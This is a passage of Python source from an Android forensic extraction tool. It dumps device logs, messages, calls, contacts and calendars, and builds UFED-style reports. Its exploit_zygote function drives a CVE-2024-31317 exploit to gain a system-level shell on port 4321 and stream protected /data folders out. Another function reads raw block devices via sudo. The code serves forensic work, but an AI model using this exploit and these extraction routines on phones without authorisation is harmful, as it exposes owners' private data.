        "\nPlatform:   " + d_platform + "\nSoftware:   " + software + "\nBuild-Nr:   " + build + "\nLanguage:   " + locale + "\nSerialnr:   " + snr + 
        "\nWifi MAC:   " + w_mac + "\nBT-MAC:     " + b_mac + "\nData:       " + data_s + "\nFree Space: " + free + 
        "\nAD-ID :     " + ad_id + "\nIMEI :      " + imei)    
    
    #Save user-installed Apps to txt
    try: al = str(len(max([app[0] for app in apps], key=len)))  
    except: al = 40 
    file.write("\n\n" + "## Installed Apps (by user) ## \n\n")
    if len(apps) > 0:
        if ut == False:
            file.write('{:{l}}'.format("app", l=al) + "\t" + "installer\n")
        else:
            file.write('{:{l}}'.format("app", l=al) + "\t" + "version\n")
    else:
        file.write('None')
   
    for app in apps:
        file.write("\n" + '{:{l}}'.format(app[0], l=al) + "\t" + app[1])        
    file.close()
    log("Saved Device Info")

def dump_logcat(change):
    logdump = device.shell("logcat -d -b all -v threadtime", stream=True)
    buffer = b""
    with open(f"logcat_{snr}.txt", "w", encoding='utf-8') as logcfile:
        while True:
            chunk = logdump.read(1024)
            if not chunk:
                break
            buffer += chunk
            while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    logcfile.write(line.decode("utf-8", errors="replace") + "\n")
                    logcfile.flush()
    log("Extracted Logcat")
    change.set(1)

def dump_dumpsys(change):
    sysdump = device.shell("dumpsys", stream=True)
    buffer = b""
    with open(f"dumpsys_{snr}.txt", "w", encoding='utf-8') as dumpsfile:
        while True:
            chunk = sysdump.read(1024)
            if not chunk:
                break
            buffer += chunk
            while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    dumpsfile.write(line.decode("utf-8", errors="replace") + "\n")
                    dumpsfile.flush()
    log("Extracted Dumpsys")
    change.set(1)

def dump_bugreport(change, progress, prog_text):
    brpath = ""
    output = device.shell("bugreportz -p", stream=True)
    with output:
        f = output.conn.makefile()
        for _ in range(10):
            line = f.readline()
            if line.startswith("BEGIN:"):
                brpath = line.strip().split("BEGIN:")[1]
        f.close()
    try:
        device.sync.pull(brpath, f"{snr}_dumpstate.zip")
        log("Extracted Bugreport")
    except:
        log("Error extracting Bugreport")
        pass
    change.set(1)

#Query Content Providers (from the dict: content_provider.json)
def query_content(change, text, progress, prog_text, json_out=False):
    prov_file = os.path.join(os.path.dirname(__file__), "ressources" , "content_provider.json")
    error_text = ["Error while accessing provider", "Unsupported argument", "No result found", "command not found"]
    out = f"content_provider_{snr}"
    with open(prov_file) as f:
        providers = json.load(f)
    #prov_len = len(providers)
    prov_len = 0
    for key, value in providers.items():
        prov_len += 1 
        prov_len += 1
        if isinstance(value, list):
            prov_len += len(value) 
    
    i = 0
    for key, value in providers.items():
        #print(key)
        i+=1
        current = i/prov_len
        progress.set(current)
        prog_text.configure(text=f"{int(current*100)}%")
        text.configure(text=f"Extracting Data from Content Providers.\nThis may take some time.\nCurrent: {key}")
        content_out = device.shell(f"content query --uri content://{key}")
        if any(error in content_out for error in error_text):
            log(f"No content output for {key}")
            pass
        else:
            if json_out == False:
                content_path = Path(f'{out}/{key}/{key}.txt')
                content_path.parent.mkdir(parents=True, exist_ok=True)
                content_path.write_text(content_out)
            else:
                cjson = content_to_json(content_out)
                json_out = json.dumps(cjson, ensure_ascii=False, indent=2)
                json_path = Path(f'{out}/{key}/{key}.json')
                json_path.parent.mkdir(parents=True, exist_ok=True)
                json_path.write_text(json_out, encoding="utf-8")
        if isinstance(value, list):
            for item in value:
                i+=1
                current = i/prov_len
                progress.set(current)
                prog_text.configure(text=f"{int(current*100)}%")
                text.configure(text=f"Extracting Data from Content Providers.\nThis may take some time.\nCurrent: {key}/{item}")
                #print((f"content query --uri content://{key}/{item}"))
                content_out = device.shell(f"content query --uri content://{key}/{item}")
                if any(error in content_out for error in error_text):
                    log(f"No content output for {key}/{item}")
                    pass
                else:
                    if json_out == False:
                        content_path = Path(f'{out}/{key}/{key}_{item.replace("/","_")}.txt')
                        content_path.parent.mkdir(parents=True, exist_ok=True)
                        content_path.write_text(content_out)
                    else:
                        cjson = content_to_json(content_out)
                        json_out = json.dumps(cjson, ensure_ascii=False, indent=2)
                        json_path = Path(f'{out}/{key}/{key}_{item.replace("/","_")}.json')
                        json_path.parent.mkdir(parents=True, exist_ok=True)
                        json_path.write_text(json_out, encoding="utf-8")
        i+=1
        current = i/prov_len
        progress.set(current)
        prog_text.configure(text=f"{int(current*100)}%")
        if value == "":
            pass
        else:
            if not isinstance(value, list):
                content_out = device.shell(f"content query --uri content://{key}/{value}")
                if any(error in content_out for error in error_text):
                    if not isinstance(value, list):
                        log(f"No content output for {key}/{value}")
                    pass
                else:
                    text.configure(text=f"Extracting Data from Content Providers.\nThis may take some time.\nCurrent: {key}/{value}")
                    if json_out == False:
                        content_path = Path(f'{out}/{key}/{key}_{value.replace("/","_")}.txt')
                        content_path.parent.mkdir(parents=True, exist_ok=True)
                        content_path.write_text(content_out)
                    else:
                        cjson = content_to_json(content_out)
                        json_out = json.dumps(cjson, ensure_ascii=False, indent=2)
                        json_path = Path(f'{out}/{key}/{key}_{value.replace("/","_")}.json')
                        json_path.parent.mkdir(parents=True, exist_ok=True)
                        json_path.write_text(json_out, encoding="utf-8")
    change.set(1)

# Convert the content provider output to JSON
def content_to_json(text: str):
    rows = re.split(r'\bRow:\s*\d+\s*', text)
    result = []
    for row in rows:
        row = row.strip()
        if not row:
            continue
        pairs = re.findall(r'(\w+)=((?:[^,]|,(?!\s*\w+=))*)', row)
        entry = {}
        for key, value in pairs:
            value = value.strip()
            if value in ("NULL", ""):
                entry[key] = None
            else:
                entry[key] = value
        result.append(entry)
    return result

#Physical Extraction for Ubuntu Touch
def ut_physical(change, text, progress, prog_text, pw_box=None, ok_button=None, back_button=None):
    if ut == True:
        sh_pwd = pw_box.get()
        pw_box.pack_forget()
        ok_button.pack_forget()
        back_button.pack_forget()

    #live device
    if recovery == True:
        dev_cmd = device.shell("ls /dev/block")
    else:
        dev_cmd = device.shell("ls /dev")
    if "mmcblk0" in dev_cmd:
        target = "mmcblk0"
    elif "sda" in dev_cmd:
        target = "sda"
    else:
        target = None
    if target == None:
        text.configure(text="Block Device not found!")
        log("No Block Device found")
        change.set(1)
        return

    else:
        size = int(device.shell(f"cat /sys/block/{target}/size"))*512
        if ut == True:
            amiroot = device.shell(f"echo {sh_pwd} | sudo -S whoami 2>/dev/null")
        if aos == True:
            amiroot = device.shell("whoami 2>/dev/null")
        else:
            amiroot = device.shell("whoami 2>/dev/null")
        if amiroot == "root":
            prog_text.pack()
            progress.pack()
            current = 0
            out_file = f"{snr}_{target}.bin"
            if recovery == True:
                target = f"block/{target}"
            with open(out_file, "wb") as f:
                if ut == True:
                    proc = subprocess.Popen(["adb", "exec-out", f"echo {sh_pwd}| sudo -S cat /dev/{target} 2>/dev/null"], stdout=subprocess.PIPE)
                    stream = proc.stdout
                else:
                    proc = subprocess.Popen(["adb", "exec-out", f"cat /dev/{target} 2>/dev/null"], stdout=subprocess.PIPE)
                    stream = proc.stdout
                while True:
                    chunk = stream.read(65536)
                    text.configure(text="Physical Backup is running.\nThis may take some time.")
                    if not chunk:
                        break
                    f.write(chunk)
                    current += len(chunk)

                    perc = (100 / size) * current
                    prog_text.configure(text=f"{round(perc)}%")  
                    progress.set(perc/100)
                    prog_text.update()
                    progress.update()
            prog_text.pack_forget()
            progress.pack_forget()
            text.configure(text="Physical Backup complete!")
        else:
            text.configure(text="Wrong password! Try again.")
            log("Wrong password")
        change.set(1)
        return

#UT App-Screenshot
def ut_app_shot():
    fbset = device.shell("fbset")
    mode_match = re.search(r'mode\s+"(\d+)x(\d+)-\d+"', fbset)
    if not mode_match:
        raise ValueError("Mode not found")
    width = int(mode_match.group(1))
    height = int(mode_match.group(2))
    if "rgba" in fbset:
        order = [0, 1, 2, 3]
    elif "argb" in fbset:
        order = [1, 2, 3, 0]
    elif "bgra" in fbset:
        order = [2, 1, 0, 3]
    elif "abgr" in fbset:
        order = [3, 2, 1, 0]
    elif "rgbx" in fbset:
        order = [0, 1, 2] + 255
    else:
        order = [0, 1, 2, 3]
    user = device.shell("whoami")
    u_id = device.shell(f"id -u {user}")
    data = device.shell(f"mirscreencast -n 1 -m /var/run/user/{u_id}/mir_socket_trusted --stdout", encoding=None)
    expected = width * height * 4
    if len(data) < expected:
        raise ValueError(f"RAW data too small")
    arr = np.frombuffer(data[:expected], dtype=np.uint8).reshape((height, width, 4))
    img = Image.fromarray(arr[:, :, order], "RGBA")
    return img

#Helper functions for DB Recreation
def create_table(cur, table_name, columns):
    cols_sql = ", ".join([f'"{col}" TEXT' for col in columns])
    cur.execute(f"CREATE TABLE IF NOT EXISTS {table_name} ({cols_sql})")

def create_table(cur, name, columns):
    col_def = ", ".join([f'"{col}" TEXT' for col in columns])
    cur.execute(f"DROP TABLE IF EXISTS {name};")
    cur.execute(f"CREATE TABLE {name} ({col_def});")

def insert_data(cur, table_name, schema_defaults, data_rows):
    columns = list(schema_defaults.keys())
    placeholders = ", ".join(["?"] * len(columns))
    sql = f"INSERT INTO {table_name} ({', '.join(columns)}) VALUES ({placeholders})"

    for row in data_rows:
        values = []
        for col in columns:
            if col in row:
                values.append(row[col])
            elif col in schema_defaults:
                values.append(schema_defaults[col])
            else:
                values.append(None)
        cur.execute(sql, values)

#Recreate Device Databases
def recreate_dbs(change, text, zip_path=None):
  
    #SMS/MMS
    text.configure(text="Attempt to recreate the mmssms.db database.")
    mmssms_db = "mmssms.db"
    try: os.remove(mmssms_db)
    except: pass
    try:
        sms_data = device.shell("content query --uri content://sms")
        sms_json = content_to_json(sms_data) 
    except:
        sms_json = [{}]
    try:
        pdu_data = device.shell("content query --uri content://mms")
        pdu_json = content_to_json(pdu_data)
    except:
        pdu_json = [{}]
    try:
        addr_data = device.shell("content query --uri content://mms/addr")
        addr_json = content_to_json(addr_data)
    except:
        addr_json = [{}]
    try:
        part_data = device.shell("content query --uri content://mms/part")
        part_json = content_to_json(part_data)
    except:
        part_data = [{}]

    mmssms_schema = os.path.join(os.path.dirname(__file__), "ressources" , "mmssms.json")
    with open(mmssms_schema, "r", encoding="utf-8") as f:
        schema = json.load(f)
    addr_defaults = schema["addr"]
    part_defaults = schema["part"]
    pdu_defaults = schema["pdu"]
    sms_defaults = schema["sms"]
    tables_map = {
        "addr": (addr_defaults, addr_json),
        "part": (part_defaults, part_json),
        "pdu": (pdu_defaults, pdu_json),
        "sms": (sms_defaults, sms_json)
    }    
    conn = sqlite3.connect(mmssms_db)
    cur = conn.cursor()
    
    for table_name, (table_defaults, table_data) in tables_map.items():
        schema_columns = list(table_defaults.keys())
        extra_columns = []
        for row in table_data:
            for key in row.keys():
                if key not in schema_columns and key not in extra_columns:
                    extra_columns.append(key)
        columns = schema_columns + extra_columns
        cur.execute(f"DROP TABLE IF EXISTS {table_name}")
        create_table(cur, table_name, columns)
        insert_data(cur, table_name, table_defaults, table_data)
    conn.commit()
    conn.close()
    log("Recreated mmssms.db (partial)")
    
    #CallLog
    text.configure(text="Attempt to recreate the calllog.db database.")
    call_db = "calllog.db"
    try: os.remove(call_db)
    except: pass
    try:
        call_data = device.shell("content query --uri content://call_log/calls")
        call_json = content_to_json(call_data)
    except:
        call_json = [{}]
    call_schema = os.path.join(os.path.dirname(__file__), "ressources" , "calllog.json")
    with open(call_schema, "r", encoding="utf-8") as f:
        schema = json.load(f)
    calls_defaults = schema["calls"]    
    conn = sqlite3.connect(call_db)
    cur = conn.cursor()
    
    schema_columns = list(calls_defaults.keys())
    extra_columns = []
    for row in call_json:
        for key in row.keys():
            if key not in schema_columns and key not in extra_columns:
                extra_columns.append(key)
    columns = schema_columns + extra_columns
    create_table(cur, "calls", columns)
    insert_data(cur, "calls", calls_defaults, call_json)
    conn.commit()
    conn.close()
    log("Recreated calllog.db (partial)")

    #CONTACTS
    text.configure(text="Attempt to recreate the contacts2.db database.")
    contact_db = "contacts2.db"
    try: os.remove(contact_db)
    except: pass
    try:
        contact_contacts = device.shell("content query --uri content://com.android.contacts/contacts")
        contact_contacts_json = content_to_json(contact_contacts)
    except:
        contact_contacs_json = [{}]
    try:
        contact_data = device.shell("content query --uri content://com.android.contacts/data")
        contact_data_json = content_to_json(contact_data)
        unique_mimetypes = {}
        next_id = 1
        for entry in contact_data_json:
            mime = entry.get("mimetype")
            if mime is None:
                continue  
            if mime not in unique_mimetypes:
                unique_mimetypes[mime] = next_id
                next_id += 1
            entry["mimetype_id"] = unique_mimetypes[mime]
        mimetype_json = [{"_id": id_, "mimetype": mime} for mime, id_ in unique_mimetypes.items()]
    except:
        contact_data_json = [{}]
        mimetype_json = [{}]
    try:
        contact_raw_contacts_data = device.shell("content query --uri content://com.android.contacts/raw_contacts")
        contact_raw_contacts_json = content_to_json(contact_raw_contacts_data)
    except:
        contact_raw_contacts_json = [{}]
    try:
        contact_settings_data = device.shell("content query --uri content://com.android.contacts/settings")
        contact_settings_json = content_to_json(contact_settings_data)
    except:
        contact_settings_json = [{}]
    contact_schema = os.path.join(os.path.dirname(__file__), "ressources" , "contacts2.json")
    with open(contact_schema, "r", encoding="utf-8") as f:
        schema = json.load(f)
    contacts_defaults = schema["contacts"]
    data_defaults = schema["data"]
    mimetype_defaults = schema["mimetypes"]
    raw_contacts_defaults = schema["raw_contacts"]
    tables_map = {
        "contacts": (contacts_defaults, contact_contacts_json),
        "data": (data_defaults, contact_data_json),
        "mimetypes": (mimetype_defaults, mimetype_json),
        "raw_contacts": (raw_contacts_defaults, contact_raw_contacts_json)
    }    
    conn = sqlite3.connect(contact_db)
    cur = conn.cursor()
    for table_name, (table_defaults, table_data) in tables_map.items():
        schema_columns = list(table_defaults.keys())
        columns = schema_columns
        cur.execute(f"DROP TABLE IF EXISTS {table_name}")
        create_table(cur, table_name, columns)
        insert_data(cur, table_name, table_defaults, table_data)
    conn.commit()
    conn.close()
    log("Recreated contacts2.db (partial)")

    #Calendar
    text.configure(text="Attempt to recreate the calendar.db database.")
    calendar_db = "calendar.db"
    try: os.remove(calendar_db)
    except: pass
    try:
        colors_data = device.shell("content query --uri content://com.android.calendar/colors")
        colors_json = content_to_json(colors_data) 
    except:
        colors_json = [{}]
    try:
        calendars_data = device.shell("content query --uri content://com.android.calendar/calendars")
        calendars_json = content_to_json(calendars_data)
    except:
        calendars_json = [{}]
    try:
        event_data = device.shell("content query --uri content://com.android.calendar/event_entities")
        event_json = content_to_json(event_data)
    except:
        event_json = [{}]
    try:
        extended_data = device.shell("content query --uri content://com.android.calendar/extendedproperties")
        extended_json = content_to_json(extended_data)
    except:
        extended_json = [{}]
    try:
        reminders_data = device.shell("content query --uri content://com.android.calendar/reminders")
        reminders_json = content_to_json(reminders_data)
    except:
        reminders_json = [{}]
    try:
        syncstate_data = device.shell("content query --uri content://com.android.calendar/syncstate")
        syncstate_json = content_to_json(syncstate_data)
    except:
        syncstate_json = [{}]
    
    calendar_schema = os.path.join(os.path.dirname(__file__), "ressources" , "calendar.json")
    with open(calendar_schema, "r", encoding="utf-8") as f:
        schema = json.load(f)
    calendar_defaults = schema["Calendars"]
    color_defaults = schema["Colors"]
    event_defaults = schema["Events"]
    extended_defaults = schema["ExtendedProperties"]
    reminders_defaults = schema["Reminders"]
    sync_defaults = schema["_sync_state"]
    tables_map = {
        "Calendars": (calendar_defaults, calendars_json),
        "Colors": (color_defaults, colors_json),
        "Events": (event_defaults, event_json),
        "ExtendedProperties": (extended_defaults, extended_json),
        "Reminders": (reminders_defaults, reminders_json),
        "_sync_state": (sync_defaults, syncstate_json)
    }  
    conn = sqlite3.connect(calendar_db)
    cur = conn.cursor()
    for table_name, (table_defaults, table_data) in tables_map.items():
        schema_columns = list(table_defaults.keys())
        columns = schema_columns
        cur.execute(f"DROP TABLE IF EXISTS {table_name}")
        create_table(cur, table_name, columns)
        insert_data(cur, table_name, table_defaults, table_data)
    conn.commit()
    conn.close()
    log("Recreated calendar.db (partial)")

    #packages.list
    text.configure(text="Attempt to recreate the packages.list")
    packages_list = "packages.list"
    try: os.remove(packages_list)
    except: pass
    with open(packages_list, "w", encoding="utf-8") as pl:
        for app in all_apps:
            a_class = device.shell(f"pm path {app}")
            if "priv-app" in a_class:
                pack_class = "platform:privapp"
            elif "vendor" in a_class:
                pack_class = "platform:vendor"
            else:
                pack_class = "default"
            dumpsys = device.shell(f"dumpsys package {app}")
            app_dir = re.search(r"dataDir=([^\s]+)", dumpsys)
            app_uid = re.search(r"\buid=(\d+)", dumpsys)
            app_tar = re.search(r"targetSdk=(\d+)", dumpsys)
            gids_matches = re.findall(r"gids=\[([^\]]*)\]", dumpsys)
            gids = []
            baseapk_match = re.search(r"base\.apk\s*-\s*(\d+)", dumpsys)
            baseapk_value = baseapk_match.group(1) if baseapk_match else 0
            for match in gids_matches:
                gids += [g.strip() for g in match.split(',') if g.strip()]
            app_gids = sorted(set(gids), key=int) if gids else None
            gid_str = ",".join(gids) if gids else "none"
            pl.write(f"{app} {app_uid.group(1) if app_uid else 0} 0 {app_dir.group(1) if app_dir else 'none'} {pack_class}:targetSdkVersion={app_tar.group(1) if pack_class else 0} {gid_str} 0 {baseapk_value}\n")
    log("Recreated packages.list")

    if zip_path != None:
        with zipfile.ZipFile(zip_path, mode="a") as zf:
            if os.path.exists(mmssms_db):
                zf.write(mmssms_db, "data/data/com.android.providers.telephony/databases/mmssms.db")
            if os.path.exists(call_db):
                zf.write(call_db, "data/data/com.android.providers.contacts/databases/calllog.db")
            if os.path.exists(contact_db):
                zf.write(contact_db, "data/data/com.android.providers.contacts/databases/contacts2.db")
            if os.path.exists(calendar_db):
                zf.write(calendar_db, "data/data/com.android.providers.calendar/databases/calendar.db")
            if os.path.exists(packages_list):
                zf.write(packages_list, "data/system/packages.list")
    try: os.remove(mmssms_db)
    except: pass
    try: os.remove(call_db)
    except: pass
    try: os.remove(contact_db)
    except: pass
    try: os.remove(calendar_db)
    except: pass
    try: os.remove(packages_list)
    except: pass
    change.set(1)

def ufed_style_files(change, ufed_folder, zip, zipname, starttime, text):
    text.configure(text="Creating UFED-Style Report files.")
    with open(os.path.join(ufed_folder, "InstalledAppsList.txt"), "w") as apps_file:
        for app in all_apps:
            apps_file.write(f"{app}\n")
    #Contacts
    text.configure(text="Creating UFED-Style Report files.\nQuery: content://com.android.contacts/data/phones")
    contact_query = device.shell("content query --uri content://com.android.contacts/data/phones")
    contact_json = content_to_json(contact_query)
    #Calls
    text.configure(text="Creating UFED-Style Report files.\nQuery: content://call_log/calls")
    calls_query = device.shell("content query --uri content://call_log/calls")
    calls_json = content_to_json(calls_query)
    #Calendar
    text.configure(text="Creating UFED-Style Report files.\nQuery: content://com.android.calendar/event_entities")
    calendar_query = device.shell("content query --uri content://com.android.calendar/event_entities")
    calendar_json = content_to_json(calendar_query)
    #SMS
    text.configure(text="Creating UFED-Style Report files.\nQuery: content://sms")
    sms_query = device.shell("content query --uri content://sms")
    sms_json = content_to_json(sms_query)

    end = datetime.now()
    local_timezone = datetime.now(timezone.utc).astimezone().tzinfo
    utc_offset = end.astimezone().utcoffset()
    utc_offset_hours = utc_offset.total_seconds() / 3600
    if utc_offset_hours >= 0:
        sign = "+"
    else:
        sign = "-"
    output_format = "%d/%m/%Y %H:%M:%S" 
    endtime = str(end.strftime(output_format)) + " (" + sign + str(int(utc_offset_hours)) + ")"

    #Report.xml   
    text.configure(text="Creating UFED-Style Report files.\nCreating Report.xml")
    xml_path = os.path.join(ufed_folder, "report.xml")
    reportxml = ufed_style.ufd_report_xml(contact_json, calls_json, calendar_json, sms_json, brand, model, software, build, imei, ad_id, starttime, endtime, a_version, f"{zipname}.zip")
    with open(xml_path, "w", encoding="utf-8", errors="ignore") as xml_file:
        xml_file.write(reportxml)
    with zipfile.ZipFile(f'{os.path.join(ufed_folder, zipname)}.zip', mode="a") as zf:
        zf.write(xml_path, "logical/Report.xml")
    try: os.remove(xml_path)
    except: pass

    #UFD-File
    text.configure(text="Creating UFED-Style Report files.\nCalculating Zip-Hash. This may take a while.")
    try:
        with open(f'{os.path.join(ufed_folder, zipname)}.zip', 'rb', buffering=0) as z:
            z_hash = hashlib.file_digest(z, 'sha256').hexdigest()
    except:
        z_hash = " Error - Python >= 3.11 required"

    text.configure(text="Creating UFED-Style Report files.\nCreating UFD-File")
    with open(f'{os.path.join(ufed_folder, zipname)}.ufd', "w") as ufdf:
        ufdf.write("[Backup]\nSharedBackupEnabled=True\nType=ZIP\nZIPLogicalPath=backup\n\n" + "[DeviceInfo]\nChipset=" + d_platform + "\nModel=" + model + "\nOS=" + software + "\nSecurityPatchLevel=" + spl + "\nVendor=" + brand + "\n\n[Dumps]\nBackup=" + zipname +
        ".zip\nXML=" + zipname + ".zip\n\n[ExtractionStatus]\nExtractionStatus=Success\n\n[General]\nADBPull=True\nAcquisitionTool=ALEX by Christian Peter\nAndroid_ID=" + ad_id + "\nConnectionType=Cable No. 100 or 170\nDate=" + starttime + "\nDevice=Report\nEndTime=" + 
        endtime + "\nExtractionMethod=ADB_BACKUP\nExtractionType=AdvancedLogical\nFullName=" + fname_s + "\nGUID=\nInternalBuild=\nMachineName=\nModel=" + model + 
        "\nSuggested = Profile\nUfdVer=1.2\nUnitId=\nUserName=\nVendor=Detected Model\nVersion=other\n\n[InstalledApps]\nFile=InstalledAppsList.txt\n\n[SHA256]\n" + zipname + ".zip=" + z_hash.upper() + "\n\n[XML]\nType=ZIP\nZIPLogicalPath=logical/Report.xml")
    
    change.set(1)
    

def get_data_size(data_path, change):
    global total_size
    size_cmd = device.shell(f"du -ks {data_path} 2>/dev/null")
    try:
        total_size = int(size_cmd.split()[0])*1024
    except Exception as e:
        print(e)
        total_size = 1
    change.set(1)


def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, prog_text, progress, change, exist_ok: bool = True, zip=None, mode="default") -> int:
    """Pull directory from device:src into local:dst

    Returns:
        total files size pulled

    Modified function from adbutils for percentage output
    """

    text.configure(text=f"Extracting: {src}")
    rootf = src
    def rec_pull_contents(src: str, dst: typing.Union[str, pathlib.Path], rootf: str, rel_in_zip: str, prog_text, progress, exist_ok: bool = True) -> int:
        s = 0
        global data_size
        global total_size
        items = list(self.iter_directory(src))

        items = list(filter(
            lambda i: i.path != '.' and i.path != '..',
            items
        ))

        dirs = [f for f in items if (f.mode & stat.S_IFMT(f.mode)) == stat.S_IFDIR]
        files = [f for f in items if (f.mode & stat.S_IFMT(f.mode)) == stat.S_IFREG]

        
        for dir in dirs:
            dirout = dir.path
            if platform.uname().system == 'Windows':
                dirout = re.sub(r"[?%*:|\"<>\x7F\x00-\x1F]", "-", dir.path)
                if dir.path != dirout:
                    log(f"Renamed {dir.path} to {dirout}")
            new_src:str = append_path(src, dir.path) 
            new_dst:pathlib.Path = pathlib.Path(append_path(dst, dirout)) 
            os.makedirs(new_dst, exist_ok=exist_ok)
            if mode == "ufed":
                zip_dir_path = f'backup/{rootf.strip("/")}/{rel_in_zip}/{dir.path}/'.replace("//", "/")
            else:
                zip_dir_path = f'{rootf.strip("/")}/{rel_in_zip}/{dir.path}/'.replace("//", "/")
            #print(zip_dir_path)
            zip.writestr(zip_dir_path, b'')
            new_rel = f"{rel_in_zip}/{dir.path}"
            s += rec_pull_contents(new_src, new_dst, rootf, new_rel, prog_text, progress, exist_ok=exist_ok)
                
        for file in files:
            fileout = file.path
            if platform.uname().system == 'Windows':
                fileout = re.sub(r"[?%*:|\"<>\x7F\x00-\x1F]", "-", file.path)
                if file.path != fileout:
                    log(f"Renamed {file.path} to {fileout}")

            new_src:str = append_path(src, file.path) 
            new_dst:str = append_path(dst, fileout) 
            try:
                try: 
                    mtime = self.stat(new_src).mtime.timestamp()
                except:
                    pass
                size = self.pull_file(new_src, new_dst)
                try:
                    if mtime < datetime.fromisoformat('1980-01-01').timestamp():
                        mtime = datetime.fromisoformat('1980-01-01').timestamp() 
                    os.utime(new_dst, (mtime, mtime))
                except: 
                    pass
            except:
                log(f"Error pulling: {new_src}")
                size = 0
            try:
                with open(new_dst, "rb") as f:
                    data = f.read()
                if mode == "ufed":
                    zip_rel_path = f'backup/{rootf.strip("/")}/{rel_in_zip}/{file.path}'.replace("//", "/")
                else:
                    zip_rel_path = f'{rootf.strip("/")}/{rel_in_zip}/{file.path}'.replace("//", "/")
                zip_info = zipfile.ZipInfo(zip_rel_path)
                dt = datetime.fromtimestamp(mtime) or datetime.now()
                zip_info.date_time = dt.timetuple()[:6]
                zip.writestr(zip_info, data)
                os.remove(new_dst)
            except Exception as e:
                log(f"Error zipping: {new_dst}: {e}")
                print(f"Error zipping {new_dst}: {e}")

            s += size
            data_size += size   
            if data_size > total_size:
                data_size = total_size      
            perc = (100 / total_size) * data_size
            prog_text.configure(text=f"{round(perc)}%")  
            progress.set(perc/100)
            prog_text.update()
            progress.update()

        return s


    if isinstance(dst, str):
        dst = pathlib.Path(dst)
        
    os.makedirs(dst, exist_ok=exist_ok)
    func_size = rec_pull_contents(src, dst, rootf, rel_in_zip="", prog_text=prog_text, progress=progress, exist_ok=exist_ok)
    #zip.close()
    log(f"Pulled {rootf}")
    change.set(1)
    return func_size

# Exploiting CVE-2024–31317 to get system-user files (Android 9-11)
def exploit_zygote(zip_path, text, prog_text, change):

    text.configure(text="Expoliting CVE-2024–31317 to acquire \"system\"-Files")
    zytotal = 0
    def dump_folder_cve(name, zipname):
        cmd = f'tar cf - {name} 2>/dev/null\nexit\n'
        cmd_bytes = cmd.encode("utf-8")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  
        start_time = time.time()
        try:
            #print(f"[+] connecting to {host}:4321 …")
            sock.connect((host, 4321))

            sock.settimeout(timeout_seconds)

            #print(f"[+] sending command: {cmd.strip()!r}")
            text.configure(text=f"Expoliting CVE-2024–31317 to acquire \"system\"-Files\nTrying to pull {name}")
            sock.sendall(cmd_bytes)
            CHUNK = 1024 * 1024
            with zipfile.ZipFile(zipname, "a", compression=zipfile.ZIP_DEFLATED) as zf:
                class SocketReader(io.RawIOBase):
                    
                    def read(self, n=-1):
                        global zytotal
                        try:
                            sock_data = sock.recv(n if n > 0 else 65536)
                            zytotal += len(sock_data)
                            prog_text.configure(text=f"{zytotal/1024/1024:.1f} MB written")
                            return sock_data
                        except socket.timeout:
                            return b""
                
                fileobj = SocketReader()

                with tarfile.open(fileobj=fileobj, mode="r|*") as tar: 
                    for member in tar:
                        if not member.isfile():
                            continue  
                        f = tar.extractfile(member)
                        if f is None:
                            continue
                        #data = f.read()
                        #zf.writestr(member.name, data)
                        with zf.open(member.name, "w") as zf_out:
                            while True:
                                chunk = f.read(CHUNK)
                                if not chunk:
                                    break
                                zf_out.write(chunk)
                        zf.fp.flush()
                        os.fsync(zf.fp.fileno())
        
        except Exception as e:
            log(f"Error dumping {name}: {e}")

        finally:
            try:
                sock.close()
            except Exception:
                pass
            return zytotal

    def send_and_receive(sock, cmd, idle_timeout=0.3, overall_timeout=4.0):
        if not cmd.endswith("\n"):
            cmd = cmd + "\n"
        sock.sendall(cmd.encode("utf-8"))
        chunks = []
        start = time.time()
        while True:
            if time.time() - start > overall_timeout:
                break
            r, _, _ = select.select([sock], [], [], idle_timeout)
            if r:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            else:
                break
        return b"".join(chunks).decode("utf-8", errors="ignore")

    cve_file = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2024_31317.txt")
    with open(cve_file,"r") as f:
        cve_cmd = f.read()
    try: device.shell(cve_cmd, timeout=4)
    except: pass
    cmd = '''sh -c \"echo 'toybox whoami' | toybox nc localhost 4321\"'''
    z_whoami = device.shell(cmd)
    #print(z_whoami)
    if "system" in z_whoami:
        log("Device is vulnerable to CVE-2024–31317")
        device.forward("tcp:4321", "tcp:4321")
        host = "localhost"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  
        sock.connect((host, 4321))
        data_test = send_and_receive(sock=sock, cmd='ls /data')

        timeout_seconds=600

        app_uid = {}
        #device.forward("tcp:4321", "tcp:4321")

        if "/data: Permission denied" in data_test:
            for app in all_apps:
                app_user = send_and_receive(sock=sock, cmd=f"stat /data/data/{app}")
                app_user_de = send_and_receive(sock=sock, cmd=f"stat /data/user_de/0/{app}")
                uid_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user)
                uid_de_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user_de)
                try:
                    uid = uid_re.group(1) if uid_re else None
                except:
                    uid = None
                try:
                    uid_de = uid_re.group(1) if uid_de_re else None      
                except:
                    uid_de = None       
                if uid != "1000" and uid != None:
                    pass
                else:
                    dump_folder_cve(f"/data/data/{app}", zip_path)
                if uid_de != "1000" and uid_de != None:
                    pass
                else:
                    dump_folder_cve(f"/data/user_de/0/{app}", zip_path)
            dump_folder_cve("/data/anr", zip_path)
            dump_folder_cve("/data/app", zip_path)
            dump_folder_cve("/data/system", zip_path)
            dump_folder_cve("/system/bin", zip_path)

        else:
            dump_folder_cve("/data/", zip_path)
            dump_folder_cve("/system/bin", zip_path)
    else:
        text.configure(text="Expoliting CVE-2024–31317 failed.")
        log("Device is not vulnerable to CVE-2024–31317 (or other issue)")
    change.set(1)


def has_root(change, timeout=30):
    result_holder = {"value": None}

    def check_root():
        try:
            result_holder["value"] = device.shell("su -c whoami").strip() == "root"
            #print(result_holder["value"])
        except Exception:
            result_holder["value"] = False

    thread = threading.Thread(target=check_root)
    thread.start()
    thread.join(timeout)

    if thread.is_alive():
        change.set(3)
        return False
    if result_holder["value"] == True:
        change.set(1)
        return True
    else:
        change.set(2)
        return True

#ALEX "logging"
def log(text):
    with open(f"ALEX_log_{snr}.log", 'a', encoding="utf-8") as logfile:
